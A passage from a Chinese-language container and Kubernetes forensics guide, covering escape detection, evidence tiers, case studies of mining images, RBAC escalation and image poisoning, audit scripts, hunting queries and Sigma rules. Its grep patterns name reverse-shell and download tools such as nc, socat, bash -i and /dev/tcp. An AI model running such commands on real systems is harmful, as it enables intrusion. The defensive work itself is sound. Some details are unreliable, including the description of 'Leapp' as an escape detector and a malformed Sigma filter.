ausearch -k docker -ts recent | grep -E 'mount|ptrace|chroot|unshare|setns'
```

检查 sysdig/falco 事件日志：

```bash
journalctl -u falco --since "1 hour ago" | grep -iE 'escape|container_drift|sensitive_mount'
```

### 4. 从容器日志中检测逃逸尝试

```bash
grep -r "nsenter\|chroot\|mount /dev\|mount -t proc" /var/lib/docker/containers/*/*.log
grep -r "curl.*evil\|wget.*malicious\|base64\|/bin/sh -i" /var/lib/docker/containers/*/*.log
grep -rE "docker.sock|privileged|hostNetwork|hostPID" /var/log/kubernetes/audit/audit.log
```

### 5. 取证工具和方法

**Sysdig**

```bash
sysdig -pc container.name=<name> evt.type in (mount, ptrace, chroot, unshare, setns)
```

**Falco 规则**

```yaml
- rule: Container Escape Attempt
  desc: Detect potential container escape via privileged operations
  condition: >
    evt.type in (mount, ptrace, chroot) and
    container and not container.id = host
  output: >
    Privileged operation in container
    (user=%user.name command=%proc.cmdline container=%container.name
    container_id=%container.id image=%container.image.repository)
  priority: CRITICAL
  tags: [container, escape]
```

**Leapp**

Leapp 是一个专门的容器逃逸检测工具：

```bash
leapp scan --image <image_name>
```

---

## 0x10 证据强度分层

容器/Kubernetes 环境中的证据需要按照可靠性进行分层评估：

### 1. 确认恶意（Confirmation Level）

以下证据可以直接确认恶意行为：

| 证据类型 | 说明 | 示例 |
|---------|------|------|
| 容器内发现恶意二进制文件 | 静态分析确认为恶意软件 | 镜像层中存在已知挖矿程序 |
| 审计日志中的恶意操作 | 完整的攻击链日志 | K8s 审计日志显示从创建 Pod 到执行恶意命令的完整链 |
| etcd 中的恶意配置 | 被篡改的 Deployment/Service | Deployment 镜像指向恶意仓库 |
| 容器内网络外联确认 | 实际的恶意外联流量 | PCAP 捕获到与 C2 服务器的通信 |
| 容器逃逸成功的直接证据 | 宿主机上的逃逸痕迹 | 容器进程在宿主机上创建了文件 |

### 2. 高度可疑（High Suspicion Level）

以下证据具有较高的可疑度，需要进一步验证：

| 证据类型 | 说明 | 示例 |
|---------|------|------|
| 异常的镜像来源 | 非官方或未知的镜像仓库 | 来自 `registry.evil.com` 的镜像 |
| 特权容器配置 | 容器以特权模式运行 | `--privileged` 或 `CAP_SYS_ADMIN` |
| 异常的 ServiceAccount 权限 | SA 绑定了 ClusterRole | SA 绑定了 `cluster-admin` |
| 异常的容器资源使用 | CPU 使用率持续异常 | 容器 CPU 使用率 > 90% 持续运行 |
| 可疑的 Pod 创建模式 | 从异常来源创建的 Pod | 非常规命名空间中的 Pod 创建 |

### 3. 需要关注（Attention Level）

以下证据需要进一步调查以确定其性质：

| 证据类型 | 说明 | 示例 |
|---------|------|------|
| 镜像中的已知漏洞 | 存在未修复的 CVE | 镜像中存在 Critical 级别的 CVE |
| 缺少 NetworkPolicy | 命名空间缺少网络策略 | 默认命名空间无任何 NetworkPolicy |
| Secret 明文存储 | Secret 未加密存储 | etcd 未启用加密 |
| 容器运行用户为 root | 容器以 root 用户运行 | Dockerfile 未指定 USER 指令 |
| 日志缺失 | 关键组件日志缺失 | 审计日志未覆盖关键操作 |

---

## 0x11 公开案例中的容器/K8s 取证

### 案例一：挖矿木马容器感染 — 恶意镜像分析

**背景**

2023 年，安全研究人员在公共 Docker Hub 上发现了大量包含加密挖矿程序的恶意镜像，这些镜像通过伪装成合法的开发工具吸引用户拉取使用。

**攻击链**

1. 攻击者在 Docker Hub 上发布包含挖矿程序的镜像
2. 镜像的 Dockerfile 通常包含一个正常的 ENTRYPOINT 和一个隐藏的挖矿进程启动命令
3. 挖矿程序在容器启动后通过 crond 或后台进程静默运行
4. 部分镜像还会扫描宿主机上的 Docker Socket 以进行横向传播

**取证分析要点**

```bash
docker history suspicious-miner --no-trunc | grep -iE 'curl|wget|base64|eval'
docker inspect suspicious-miner | jq '.[0].Config.Entrypoint'
docker run --rm --entrypoint="" suspicious-miner find / -name "*.miner*" -o -name "config.json" -path "*pool*" 2>/dev/null
```

关键发现：
- 镜像的第三层通过 `ADD` 指令引入了一个预编译的 XMRig 挖矿程序
- Entrypoint 设置为 `/bin/sh -c "crond && /app/start.sh"`，其中 crond 负责定时检查挖矿进程
- 环境变量中包含了矿池地址和钱包地址

### 案例二：Kubernetes RBAC 提权 — 权限提升取证

**背景**

在一次真实的入侵事件中，攻击者利用了 Kubernetes RBAC 配置中的过度授权，从一个受限的 ServiceAccount 逐步提升到集群管理员权限。

**攻击链**

1. 攻击者获得了 Default 命名空间中一个 Pod 的代码执行权限
2. 发现 Default SA 被授权了 `get secrets` 权限（误配置）
3. 利用 SA Token 获取了其他命名空间的 Secret
4. 发现 kube-system 命名空间中的一个 Secret 包含了管理员凭据
5. 使用管理员凭据创建了新的 ClusterRoleBinding

**取证分析要点**

```bash
cat /var/log/kubernetes/audit/audit.log | jq 'select(.user.username == "system:serviceaccount:default:default" and .verb == "get" and .objectRef.resource == "secrets") | {time: .requestReceivedTimestamp, secret: .objectRef.name, namespace: .objectRef.namespace, code: .responseStatus.code}'
cat /var/log/kubernetes/audit/audit.log | jq 'select(.user.username == "system:serviceaccount:default:default" and .verb == "create" and .objectRef.resource == "clusterrolebindings") | {time: .requestReceivedTimestamp, name: .objectRef.name}'
```

关键发现：
- 审计日志完整记录了从 Secret 访问到 ClusterRoleBinding 创建的全部步骤
- 攻击时间线清晰：06:00 发现权限 → 06:15 获取 Secret → 06:20 创建 ClusterRoleBinding → 06:25 创建恶意 Pod
- 使用的 SA Token 被 kube-apiserver 记录在审计日志的 `user.username` 字段中

### 案例三：供应链攻击 — 容器镜像投毒

**背景**

2024 年，安全社区报告了多起针对 CI/CD 管道的容器镜像投毒事件，攻击者通过入侵构建环境，在合法镜像中植入后门。

**攻击链**

1. 攻击者入侵了开发者的 CI/CD 环境
2. 修改 Dockerfile 在构建过程中注入后门
3. 将包含后门的镜像推送到生产镜像仓库
4. Kubernetes 集群自动拉取更新后的镜像并部署

**取证分析要点**

```bash
trivy image --scanners secret,vuln,misconfig production-image:latest
diff <(docker history production-image --no-trunc --format '{{.CreatedBy}}') <(docker history last-known-good-image --no-trunc --format '{{.CreatedBy}}')
docker run --rm --entrypoint="" production-image:latest find / -name "*.backdoor*" -o -name "shell.elf" 2>/dev/null
```

关键发现：
- 镜像的倒数第二层被插入了一条额外的 `RUN` 指令
- 该指令下载并安装了一个反向 shell 后门
- 镜像的构建时间戳与正常 CI/CD 流水线的时间不匹配
- 后门通过 crond 实现持久化，每隔 30 秒检查一次连接

---

## 0x12 容器/K8s 取证检测自动化与狩猎

### 1. Docker 安全审计脚本

```bash
#!/bin/bash
REPORT_DIR="/tmp/docker_forensics_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$REPORT_DIR"

echo "[*] Docker Info" > "$REPORT_DIR/docker_audit.txt"
docker info >> "$REPORT_DIR/docker_audit.txt" 2>&1

echo -e "\n[*] Running Containers" >> "$REPORT_DIR/docker_audit.txt"
docker ps -a --format "table {{.ID}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}\t{{.Names}}" >> "$REPORT_DIR/docker_audit.txt"

echo -e "\n[*] Privileged Containers" >> "$REPORT_DIR/docker_audit.txt"
for cid in $(docker ps -q); do
  priv=$(docker inspect --format '{{.HostConfig.Privileged}}' "$cid" 2>/dev/null)
  if [ "$priv" = "true" ]; then
    echo "PRIVILEGED: $cid ($(docker inspect --format '{{.Config.Image}}' "$cid"))" >> "$REPORT_DIR/docker_audit.txt"
  fi
done

echo -e "\n[*] Containers with Docker Socket Mounted" >> "$REPORT_DIR/docker_audit.txt"
for cid in $(docker ps -q); do
  socket=$(docker inspect --format '{{range .Mounts}}{{.Source}}{{end}}' "$cid" 2>/dev/null | grep -c "docker.sock")
  if [ "$socket" -gt 0 ]; then
    echo "DOCKER SOCKET MOUNTED: $cid ($(docker inspect --format '{{.Config.Image}}' "$cid"))" >> "$REPORT_DIR/docker_audit.txt"
  fi
done

echo -e "\n[*] Containers using Host Network" >> "$REPORT_DIR/docker_audit.txt"
for cid in $(docker ps -q); do
  hostnet=$(docker inspect --format '{{.HostConfig.NetworkMode}}' "$cid" 2>/dev/null)
  if [ "$hostnet" = "host" ]; then
    echo "HOST NETWORK: $cid ($(docker inspect --format '{{.Config.Image}}' "$cid"))" >> "$REPORT_DIR/docker_audit.txt"
  fi
done

echo -e "\n[*] Images with High/Critical CVEs" >> "$REPORT_DIR/docker_audit.txt"
for img in $(docker images --format '{{.Repository}}:{{.Tag}}' | grep -v '<none>'); do
  echo "--- Scanning $img ---" >> "$REPORT_DIR/docker_audit.txt"
  trivy image --severity HIGH,CRITICAL --quiet "$img" >> "$REPORT_DIR/docker_audit.txt" 2>&1
done

echo -e "\n[*] Docker Events (last 24h)" >> "$REPORT_DIR/docker_audit.txt"
docker events --since "24h" --until "now" --format '{{.Time}} {{.Type}} {{.Action}} {{.Actor.Attributes.name}}' >> "$REPORT_DIR/docker_audit.txt" 2>&1

echo -e "\n[*] Suspicious Processes in Containers" >> "$REPORT_DIR/docker_audit.txt"
for cid in $(docker ps -q); do
  procs=$(docker top "$cid" aux 2>/dev/null | grep -iE 'xmrig|mine|stratum|curl.*sh|wget.*sh|nc -|ncat|socat|bash -i|/dev/tcp')
  if [ -n "$procs" ]; then
    echo "SUSPICIOUS PROCS in $cid:" >> "$REPORT_DIR/docker_audit.txt"
    echo "$procs" >> "$REPORT_DIR/docker_audit.txt"
  fi
done

echo "[+] Audit report saved to $REPORT_DIR/docker_audit.txt"
```

### 2. Kubernetes 审计日志分析脚本

```bash
#!/bin/bash
AUDIT_LOG="/var/log/kubernetes/audit/audit.log"
REPORT="/tmp/k8s_audit_report_$(date +%Y%m%d_%H%M%S).txt"

echo "[*] Non-system User API Calls" > "$REPORT"
cat "$AUDIT_LOG" | jq -r 'select(.user.username | test("^system:") | not) | "\(.requestReceivedTimestamp) \(.user.username) \(.verb) \(.objectRef.resource // "nonResource") \(.objectRef.name // .requestURI) \(.responseStatus.code)"' | sort | tail -100 >> "$REPORT"

echo -e "\n[*] Secret Access Events" >> "$REPORT"
cat "$AUDIT_LOG" | jq -r 'select(.objectRef.resource == "secrets") | "\(.requestReceivedTimestamp) \(.user.username) \(.verb) \(.objectRef.namespace)/\(.objectRef.name) code:\(.responseStatus.code)"' >> "$REPORT"

echo -e "\n[*] Pod Exec Operations" >> "$REPORT"
cat "$AUDIT_LOG" | jq -r 'select(.requestURI | test("pods/.+/exec")) | "\(.requestReceivedTimestamp) \(.user.username) \(.objectRef.namespace)/\(.objectRef.name) code:\(.responseStatus.code)"' >> "$REPORT"

echo -e "\n[*] ClusterRoleBinding Creations" >> "$REPORT"
cat "$AUDIT_LOG" | jq -r 'select(.objectRef.resource == "clusterrolebindings" and .verb == "create") | "\(.requestReceivedTimestamp) \(.user.username) created \(.objectRef.name) code:\(.responseStatus.code)"' >> "$REPORT"

echo -e "\n[*] Failed Authentication Attempts" >> "$REPORT"
cat "$AUDIT_LOG" | jq -r 'select(.responseStatus.code == 401 or .responseStatus.code == 403) | "\(.requestReceivedTimestamp) \(.user.username) \(.verb) \(.objectRef.resource // "nonResource") \(.requestURI) code:\(.responseStatus.code)"' | tail -50 >> "$REPORT"

echo -e "\n[*] Port Forward Operations" >> "$REPORT"
cat "$AUDIT_LOG" | jq -r 'select(.requestURI | test("portforward")) | "\(.requestReceivedTimestamp) \(.user.username) \(.objectRef.namespace)/\(.objectRef.name) code:\(.responseStatus.code)"' >> "$REPORT"

echo "[+] Report saved to $REPORT"
```

### 3. 容器逃逸检测脚本

```bash
#!/bin/bash
REPORT="/tmp/escape_detection_$(date +%Y%m%d_%H%M%S).txt"

echo "[*] Checking for Privileged Containers" > "$REPORT"
docker ps -q | xargs -I {} sh -c 'docker inspect --format "{{.Name}} privileged:{{.HostConfig.Privileged}} pid:{{.HostConfig.PidMode}} net:{{.HostConfig.NetworkMode}} ipc:{{.HostConfig.IpcMode}}" {}' >> "$REPORT"

echo -e "\n[*] Checking for Dangerous Capabilities" >> "$REPORT"
docker ps -q | xargs -I {} sh -c 'caps=$(docker inspect --format "{{.HostConfig.CapAdd}}" {}); if [ "$caps" != "[]" ] && [ "$caps" != "[]" ]; then echo "$(docker inspect --format "{{.Name}}") caps:$caps"; fi' >> "$REPORT"

echo -e "\n[*] Checking for Docker Socket Mounts" >> "$REPORT"
docker ps -q | xargs -I {} sh -c 'docker inspect --format "{{range .Mounts}}{{.Source}}->{{.Destination}} {{end}}" {} | grep -q "docker.sock" && docker inspect --format "{{.Name}}" {}' >> "$REPORT"

echo -e "\n[*] Checking for Host PID Namespace" >> "$REPORT"
docker ps -q | xargs -I {} sh -c 'mode=$(docker inspect --format "{{.HostConfig.PidMode}}" {}); if [ "$mode" = "host" ]; then echo "HOST PID: $(docker inspect --format "{{.Name}}")"; fi' >> "$REPORT"

echo -e "\n[*] Checking for Suspicious Processes (nsenter/chroot/mount)" >> "$REPORT"
docker ps -q | xargs -I {} sh -c 'docker top {} aux 2>/dev/null | grep -iE "nsenter|chroot|unshare|mount -t|/proc/1" && echo "Container: $(docker inspect --format "{{.Name}}" {})"' >> "$REPORT"

echo -e "\n[*] Checking Host for Docker Socket Access from Non-Docker Processes" >> "$REPORT"
lsof /var/run/docker.sock 2>/dev/null >> "$REPORT"

echo -e "\n[*] Checking for Unusual Capabilities in Running Processes" >> "$REPORT"
for pid in $(ls /proc/ | grep -E '^[0-9]+$' | head -500); do
  if [ -f /proc/$pid/status ]; then
    name=$(grep '^Name:' /proc/$pid/status 2>/dev/null | awk '{print $2}')
    caps=$(grep '^CapEff:' /proc/$pid/status 2>/dev/null | awk '{print $2}')
    if [ "$caps" = "0000003fffffffff" ] || [ "$caps" = "0000001fffffffff" ]; then
      echo "PID $pid ($name) has full capabilities: $caps" >> "$REPORT"
    fi
  fi
done

echo "[+] Escape detection report saved to $REPORT"
```

### 4. 事件日志狩猎查询（SQL/KQL）

**KQL 查询 — K8s 审计日志（Azure Monitor）**

```kql
KubeAuditLogs
| where TimeGenerated > ago(24h)
| where Verb == "create" and ObjectRefResource == "pods"
| where UserUsername !startswith "system:"
| project TimeGenerated, UserUsername, Verb, ObjectRefNamespace, ObjectRefName, ResponseStatusCode
| order by TimeGenerated desc
```

```kql
KubeAuditLogs
| where TimeGenerated > ago(24h)
| where ObjectRefResource == "secrets" and Verb in ("get", "list", "watch")
| where UserUsername !startswith "system:"
| summarize SecretAccessCount = count() by UserUsername, ObjectRefNamespace, bin(TimeGenerated, 1h)
| where SecretAccessCount > 10
| order by SecretAccessCount desc
```

```kql
KubeAuditLogs
| where TimeGenerated > ago(24h)
| where RequestUri contains "exec"
| project TimeGenerated, UserUsername, ObjectRefNamespace, ObjectRefName, ResponseStatusCode
| order by TimeGenerated desc
```

**SQL 查询 — 审计日志数据库**

```sql
SELECT
  requestReceivedTimestamp,
  user_username,
  verb,
  objectRef_resource,
  objectRef_namespace,
  objectRef_name,
  responseStatus_code
FROM k8s_audit_log
WHERE objectRef_resource = 'secrets'
  AND verb IN ('get', 'list', 'watch')
  AND user_username NOT LIKE 'system:%'
  AND requestReceivedTimestamp > '2026-06-01 00:00:00'
ORDER BY requestReceivedTimestamp DESC;
```

```sql
SELECT
  user_username,
  objectRef_resource,
  verb,
  COUNT(*) as request_count,
  MIN(requestReceivedTimestamp) as first_seen,
  MAX(requestReceivedTimestamp) as last_seen
FROM k8s_audit_log
WHERE requestReceivedTimestamp > DATE_SUB(NOW(), INTERVAL 24 HOUR)
  AND user_username NOT LIKE 'system:%'
GROUP BY user_username, objectRef_resource, verb
HAVING request_count > 50
ORDER BY request_count DESC;
```

### 5. Sigma 检测规则

```yaml
title: Suspicious Container Privileged Mode Execution
id: 2a6d9f8c-e741-4a2b-b5d3-1c8e9f0a2b3c
status: experimental
description: Detects containers running in privileged mode which may indicate container escape preparation
references:
  - https://attack.mitre.org/techniques/T1611/
tags:
  - attack.privilege_escalation
  - attack.container_escape
logsource:
  category: audit
  product: kubernetes
detection:
  selection:
    verb: create
    objectRef.resource: pods
    requestObject.spec.containers.securityContext.privileged: true
  condition: selection
level: critical
falsepositives:
  - Legitimate system pods requiring privileged access
```

```yaml
title: Kubernetes ServiceAccount Token Access from Non-System Account
id: 3b7e8d9f-f842-5b3c-c6e4-2d9f0a1b3c4d
status: experimental
description: Detects non-system accounts accessing ServiceAccount tokens which may indicate credential theft
references:
  - https://attack.mitre.org/techniques/T1528/
tags:
  - attack.credential_access
  - attack.steal_access_token
logsource:
  category: audit
  product: kubernetes
detection:
  selection:
    verb: get
    objectRef.resource: secrets
    objectRef.name: "*-token-*"
  filter:
    user.username: "system:*"
  condition: selection and not filter
level: high
falsepositives:
  - Legitimate secret reading by admin users
```

```yaml
title: Kubernetes ClusterRoleBinding Creation
id: 4c8f9a0a-1d53-6c4d-d7f5-3ea01b2c4d5e
status: experimental
description: Detects creation of ClusterRoleBinding resources which may indicate privilege escalation
references:
  - https://attack.mitre.org/techniques/T1098/
tags:
  - attack.privilege_escalation
  - attack.account_manipulation
logsource:
  category: audit
  product: kubernetes
detection:
  selection:
    verb: create
    objectRef.resource: clusterrolebindings
  condition: selection
level: critical
falsepositives:
  - Legitimate cluster administration
```

```yaml
title: Container Image from Untrusted Registry
id: 5d9a0b1b-2e64-7d5e-e8a6-4fb12c3d5e6f
status: experimental
description: Detects pod creation using images from untrusted or unknown container registries
references:
  - https://attack.mitre.org/techniques/T1610/
tags:
  - attack.execution
  - attack.deploy_container
logsource:
  category: audit
  product: kubernetes
detection:
  selection:
    verb: create
    objectRef.resource: pods
  filter_trusted:
    requestObject.spec.containers.image|startswith: "registry.k8s.io/"
    or requestObject.spec.containers.image|startswith: "docker.io/library/"
    or requestObject.spec.containers.image|startswith: "gcr.io/"
    or requestObject.spec.containers.image|startswith: "quay.io/"
  condition: selection and not filter_trusted
level: medium
falsepositives:
  - Legitimate use of private registries
```

```yaml
title: Kubernetes Pod Exec Command Execution
id: 6e0b1c2c-3f75-8e6f-f9b7-5ac23d4e6f7a
status: experimental
description: Detects exec command execution into running pods which may indicate lateral movement
references:
  - https://attack.mitre.org/techniques/T1609/
tags:
  - attack.execution
  - attack.lateral_movement
logsource:
  category: audit
  product: kubernetes
detection:
  selection:
    verb: create
    requestUri|re: "/.+/pods/.+/exec"
  filter:
    user.username: "system:node:*"
  condition: selection and not filter
level: high
falsepositives:
  - Legitimate kubectl exec by administrators
```

```yaml
title: Kubernetes Secret Bulk Enumeration
id: 7f1c2d3d-4a86-9f7a-0ac8-6bd34e5f7a8b
status: experimental
description: Detects bulk enumeration of secrets which may indicate credential harvesting
references:
  - https://attack.mitre.org/techniques/T1552/
tags:
  - attack.credential_access
  - attack.unsecured_credentials
logsource:
  category: audit
  product: kubernetes
detection:
  selection:
    verb: list
    objectRef.resource: secrets
  filter:
    user.username:
      - "system:kube-controller-manager"
      - "system:kube-scheduler"
      - "system:kube-proxy"
  condition: selection and not filter
level: high
falsepositives:
  - Legitimate secret management operations
```

---

## 0x13 参考资料

1. Docker Documentation - Security: https://docs.docker.com/engine/security/
2. Kubernetes Documentation - Auditing: https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
3. Kubernetes Documentation - RBAC Authorization: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
4. CNCF Cloud Native Security Whitepaper: https://www.cncf.io/whitepapers/cloud-native-security-whitepaper/
5. etcd Documentation - Security: https://etcd.io/docs/latest/security/
6. Falco - Cloud Native Runtime Security: https://falco.org/
7. Sysdig - Container Security and Forensics: https://sysdig.com/
8. Trivy - Comprehensive Vulnerability Scanner: https://trivy.dev/
9. Aqua Security - Container Security Research: https://www.aquasec.com/
10. NIST SP 800-190 - Application Container Security Guide: https://csrc.nist.gov/publications/detail/sp/800-190/final
11. MITRE ATT&CK - Containers Matrix: https://attack.mitre.org/matrices/enterprise/containers/
12. Trail of Bits - Kubernetes Security Assessment: https://blog.trailofbits.com/
13. Kubernetes Goat - Security Training Lab: https://github.com/madhuakula/kubernetes-goat
14. CIS Docker Benchmark: https://www.cisecurity.org/benchmark/docker
15. CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes
